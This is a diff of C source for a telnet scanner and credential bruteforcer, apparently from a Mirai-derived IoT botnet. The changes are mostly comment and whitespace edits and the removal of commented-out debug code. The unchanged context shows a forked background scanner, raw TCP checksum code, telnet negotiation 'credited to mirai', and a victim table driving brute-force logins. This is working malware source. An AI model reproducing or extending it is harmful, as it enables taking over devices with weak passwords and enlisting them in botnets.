@@ -13,13 +13,15 @@ void scan_init(void) {
 
 	if ((ret = fork()) != 0)
 		return; // We are parent or it failed, lets go home
-	else { // Child has spawned and we are the child
+
+	else {
+		// Child has spawned and we are the child
 		// if (proc_root()) // Make it check for root and stuff later
 		if (scan_scanner() == false)
 			scan_able = false;
 		_exit(0);
 	}
-#endif
+#endif // SCANNER_TEST
 	return;
 }
 
@@ -38,6 +40,7 @@ static uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
 	
 	return ~sum;
 }
+
 static uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len) {
 	uint16_t *buf = buff;
 	uint32_t ip_src = iph->saddr;
@@ -70,7 +73,6 @@ static uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len
 Credits to mirai for this one
 I tried to make my own that worked but apparantly I'm not to great as it ended up making
 the telnet server send the password and login in the same packet which breaks the scanner
-It's a good time here :^)
 */
 static inline __attribute__((always_inline)) void scan_negotiate(int32_t sock) {
 	unsigned char ptr[3];
@@ -132,46 +134,6 @@ bool structcmp(unsigned char *buf, const char **str) {
 }
 
 static uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2) {
-	/*
-	// This code right here works
-	// WHAT THE _____
-	// Fill in whatever you find apropriate on that line
-	// So essentially this code actually works with nonblocking and everything
-	// I think it actually works because it waits on the select to make sure that theres data to read
-	// then it reads it
-	// I'm trying so hard not swear rn
-
-	struct timeval asdasdasd;
-	asdasdasd.tv_sec = SCAN_SCANNER_STIMEOUT_SEC;
-	asdasdasd.tv_usec = SCAN_SCANNER_STIMEOUT_USEC;
-	fd_set xas;
-	FD_ZERO(&xas);
-	FD_SET(sock, &xas);
-	int xret;
-	xret = select(sock + 1, &xas, NULL, NULL, &asdasdasd);
-	printd("Select ret %d", xret)
-
-	unsigned char bigbuf[1000];
-	int ret;
-	if ((ret = recv(sock, bigbuf, sizeof(bigbuf), MSG_NOSIGNAL)) < 0) // Read 1 from socket
-	{
-		printd("Error %d: %s", errno, strerror(errno));
-		return 0;
-	}
-	else
-	{
-		printd("Read %d bytes: %s", ret, bigbuf)
-	}
-	return 1;
-	*/
-
-	/*
-	Alright so it turns out this code worked the whole time and the 10h I spend debugging it were useless
-	Essetnailly because it was in a while (1) loop it would recv() properly until there was no data to read
-	Since I had no message that showed success it just kept going until it failed
-	I guess the strcmp() like func wasn't working so anyway I mreally messed up
-	*/
-
 	uint8_t found = 0;
 	int16_t i = 0;
 	unsigned char *buf = malloc(sizeof(unsigned char *)); // 1 byte alloc cuz I'm skilled
@@ -574,7 +536,7 @@ _breakuser:
 							printd("%d->%s Finished", i, ipv4_unpack(victim_table[i].ip));
 							close(victim_table[i].sock);
 							victim_table[i].state = END;
-							goto _breakbrute; // If one of our cons is free lets go find a new thing to bruteforce :)
+							goto _breakbrute; // If one of our cons is free lets go find a new thing to bruteforce
 						}
 						case END: {
 							break;
